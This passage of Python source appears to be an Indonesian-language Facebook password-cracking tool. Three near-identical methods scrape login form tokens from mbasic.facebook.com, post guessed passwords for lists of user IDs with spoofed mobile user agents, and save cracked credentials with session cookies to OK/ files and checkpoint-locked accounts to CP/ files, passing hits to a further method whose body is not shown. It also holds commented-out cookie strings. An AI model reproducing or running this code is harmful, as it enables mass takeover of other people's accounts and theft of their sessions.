    # 'Cookie': 'datr=xCzHZiKn-XipDq6TKrdXtPHk; sb=xSzHZgP3OnOMR-U9HS8co5j9; dpr=1.75; ps_l=1; ps_n=1; usida=eyJ2ZXIiOjEsImlkIjoiQXNpbnBjdjFnYWd6ankiLCJ0aW1lIjoxNzI0MzkxOTc1fQ%3D%3D; fr=0oF59jwMGBdwuQpsL..Bmx8W6..AAA.0.0.BmyCIr.AWUqyIFCEU0; wd=980x1787',
}
				response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?next=https://business.facebook.com/business/loginpage/fbauth/?next%3Dhttps%3A%2F%2Fdevelopers.facebook.com%2F%3Fnav_ref%3Dbiz_unified_f3_login_page_to_dfc%26biz_login_source%3Dbiz_unified_f3_fb_login_button%26join_id%3Dff9c6dd9-5bc8-4af7-97bf-9ef03c6c0416&refsrc=deprecated&lwv=100&refid=9', headers=headers,data=data, allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict():
					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{ua} \n ')
					info = f"{user} ◊ {pw} ◊ {kukis}"
					ok.append(f"{info}")
					open(f'OK/{waktu}.txt', 'a').write(f"{info}\n");self.___raka_andrian_tara___(kukis,user,pw)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{ua} \n ')
					info = f'{user} ◊ {pw}'
					cp.append(f'{info}')
					open(f'CP/{waktu}.txt', 'a').write(f"{info}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(31)
			
		loop+=1

	def reg(self, user, peweh):
		global ok,cp,loop 
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print (f"\r {komtol}• {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
		ua = self.UserAgent(user)
		for pw in peweh:
			try: 
				ses = requests.Session()
				link=ses.get(f"https://mbasic.facebook.com/login/?email={user}&li=qO16Zqor9faJsHgs32zwaN3E&e=1348131&shbl=1&wtsid=rdr_0MUGdT61PuZolYZaN&refsrc=deprecated&rtime=1719332284&hrc=1&_rdr")
				data={'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': user,'pass': pw,'login': 'Masuk','bi_xrwh': '0',}
				headers = {'User-Agent': ua,'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Content-Type': 'application/x-www-form-urlencoded','cache-control': 'max-age=0','dpr': '1.75','viewport-width': '980','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-ch-ua-model': '"SM-A115F"','sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-ch-prefers-color-scheme': 'dark','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
				params = {'refsrc': 'deprecated', 'lwv': '100', 'refid': '8',}
				response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',params=params, headers=headers, data=data, allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict():
					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{ua} \n ')
					info = f"{user} ◊ {pw} ◊ {kukis}"
					ok.append(f"{info}")
					open(f'OK/{waktu}.txt', 'a').write(f"{info}\n");self.___raka_andrian_tara___(kukis,user,pw)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{ua} \n ')
					info = f'{user} ◊ {pw}'
					cp.append(f'{info}')
					open(f'CP/{waktu}.txt', 'a').write(f"{info}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(31)
			
		loop+=1
		
	def bussines(self, user, peweh):
		global ok,cp,loop 
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print (f"\r {komtol}• New {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}",end="")
		ua = self.UserAgent(user)
		for pw in peweh:
			try: 
				ses = requests.Session()
				link = ses.get(f'https://mbasic.facebook.com/login/?email={user}&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Fmeta-pixel%2F%3Flocale%3Did_ID&li=00u1ZjuuuIJkghTx-hHSLLbu&e=1348131&shbl=1&locale2=id_ID&wtsid=rdr_07jmxNTFSqpJ3bW0e&refsrc=deprecated&_rdr')
				data = {
    'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
    'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
    'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
    'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
    'try_number': '0',
    'unrecognized_tries': '0',
    'email': user,
    'pass': pw,
    'login': 'Masuk',
    'bi_xrwh': '0',
}
				headers = {
    'User-Agent': ua,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Content-Type': 'application/x-www-form-urlencoded',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'viewport-width': '980',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-ch-ua-model': '"SM-A115F"',
    'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.71", "Google Chrome";v="126.0.6478.71"',
    'sec-ch-prefers-color-scheme': 'dark',
    'upgrade-insecure-requests': '1',
    'origin': 'https://mbasic.facebook.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'referer': 'https://mbasic.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Fmeta-pixel%2F%3Flocale%3Did_ID&locale=id_ID&refsrc=deprecated&_rdc=1',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority': 'u=0, i',
    # 'Cookie': 'datr=hdCxZs-Q8AnxfumjikCdxS3U; sb=hdCxZnhpqbivQv7DGbR68jT1; dpr=1.75; locale=id_ID; ps_l=1; ps_n=1; m_pixel_ratio=1.75; usida=eyJ2ZXIiOjEsImlkIjoiQXNoeDg1czZ0d3ozNCIsInRpbWUiOjE3MjMxNTczNjN9; wd=412x751; fr=1esXPYf6lVg96WCjt.AWXvZIj3N1RCPZJH5WtFksDXIp0.Bmswq4..AAA.0.0.BmtUvE.AWWceCPJHGc',
}
				response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?next=https://developers.facebook.com/docs/meta-pixel/?locale%3Did_ID&refsrc=deprecated&lwv=100&locale2=id_ID', headers=headers, data=data, allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict():
					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{ua} \n ')
					info = f"{user} ◊ {pw} ◊ {kukis}"
					ok.append(f"{info}")
					open(f'OK/{waktu}.txt', 'a').write(f"{info}\n");self.___raka_andrian_tara___(kukis,user,pw)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{ua} \n ')
					info = f'{user} ◊ {pw}'
					cp.append(f'{info}')
					open(f'CP/{waktu}.txt', 'a').write(f"{info}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(31)
			
		loop+=1
	# FINISH
	def hasil(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			print (f"\n\n{H} √ {P}crack selesai....")
			print (f"{H} + OK: {len(ok)} ")
			print (f"{K} + CP: {len(cp)}{P}");exit()
		else:
			exit(f"\n {M}× ops tidak mendapatkan hasil")
	
	#--- USER AGENT
	def UA(self):
		try:
			uas = open('ugent.txt','r').read()
		except (FileNotFoundError,IOError):
			uas = ("Mozilla/5.0 (Linux; Android 4.4.2; BQS-4007 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36")
			open('ugent.txt','w').write(uas)
		
		return uas 
			
	def user_agentAPI(self):
		ugent =[
			"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 11; RMX3501 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]",
			"Mozilla/5.0 (Linux; Android 12; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]",
			"Mozilla/5.0 (Linux; Android 12; RMX2111 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/390.2.0.29.103;]",
			"Mozilla/5.0 (Linux; Android 12; AC2003 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]",
			"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; U; Android 12; en-US; SM-A2829J) AppleWebKit/537.36 (KHTML, like Gecko)  UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; Pixel Build/QP1A.190711.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]",
			"Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
			"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36","Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36","Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba",
			"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
			"[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]",
			"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
			"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Series40; Nokia501/1.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.0.0.0.67",
			"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4","Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11",
			"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1","Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5230/51.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
			"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", 
			"Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia500/111.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1","Mozilla/5.0 (Series40; Nokia110/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.62.10",
			"Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45","Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-06/23.6.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
			"Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45","Mozilla/5.0 (Series40; Nokia2700c-2/07.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45",
			"Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45",  "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia201/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14",
		]
		rand_ua = random.choice(ugent)
		return rand_ua 

if __name__=="__main__":
	#os.system("clear")
	#os.system("git pull")
#	try:os.mkdir('data')
#	except:pass 
	try:os.mkdir('CP')
	except:pass 
	try:os.mkdir('OK')
	except:pass 
	menu()
